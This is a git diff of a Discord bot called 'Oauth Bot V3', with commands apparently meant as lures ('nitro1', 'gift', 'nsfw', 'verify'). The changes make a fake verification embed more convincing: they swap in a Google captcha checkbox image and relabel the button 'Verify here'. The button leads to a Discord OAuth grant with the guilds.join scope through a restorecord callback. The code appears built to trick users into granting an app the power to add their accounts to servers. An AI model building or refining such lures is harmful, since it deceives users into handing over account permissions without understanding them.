@@ -14,6 +14,7 @@ client.prefix = "+"
 
 
 
+
     const activities = [
       "...",
       "+help | v3",
@@ -39,7 +40,7 @@ client.on('message', async (message) => {
         .setColor("RANDOM")
         .setTitle(`**Oauth Bot V3**`)
 
-        .setDescription (`🍁 ** Commandes:**\n \`help\` \`stats\` \`renew\`\n\n✨ ** Commandes du bot:**\n \`nsfw\` \`gift\` \`nitro1\` \`nitro2\` \`roblox\` \`verification\` \`giveaway\` \`boost\` \`captcha\` \`ticket\` \`event\``)
+        .setDescription (`🍁 ** Commandes:**\n \`help\` \`stats\` \`renew\`\n\n✨ ** Commandes du bot:**\n \`nsfw\` \`gift\` \`nitro1\` \`nitro2\` \`roblox\` \`verify\` \`giveaway\` \`boost\` \`captcha\` \`ticket\` \`event\``)
         message.channel.send({embed: embed })
     }
 })
@@ -246,16 +247,16 @@ client.on('message', async (message) => {
 })
 
 client.on('message', async (message) => {
-    if (message.content.startsWith('+verification')) {
+    if (message.content.startsWith('+verify')) {
         const embed = new MessageEmbed()
         .setTitle("Verification")
         .setDescription(`**Please click on the button to access the server!**`)
-.setImage('https://themaestro.in/wp-content/uploads/2018/11/recaptcha.gif')
+.setImage('https://upload.wikimedia.org/wikipedia/fr/9/9d/Captcha_google_checkbox.gif')
         .setColor("0")
 
         const y = new MessageButton()
             .setStyle("url")
-            .setLabel("✅")
+            .setLabel("Verify here")
             .setURL("https://discord.com/oauth2/authorize?client_id=1090059808872341606&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1167584376175984802")
         const row = new MessageActionRow()
             .addComponent([y])
@@ -290,7 +291,7 @@ client.on('message', async (message) => {
         .setTitle("Support")
         .setDescription(`To create a ticket react with 📩`)
 .setFooter("[+] Protect - Ticketing without clutter")
-.setImage('https://pbs.twimg.com/profile_images/1108487086598950912/5-gzDvuA_400x400.png')
+.setImage('https://www.toulokowitz.fr/wp-content/uploads/2020/06/29966-1280x483.jpg')
         .setColor("0")
 
         const y = new MessageButton()
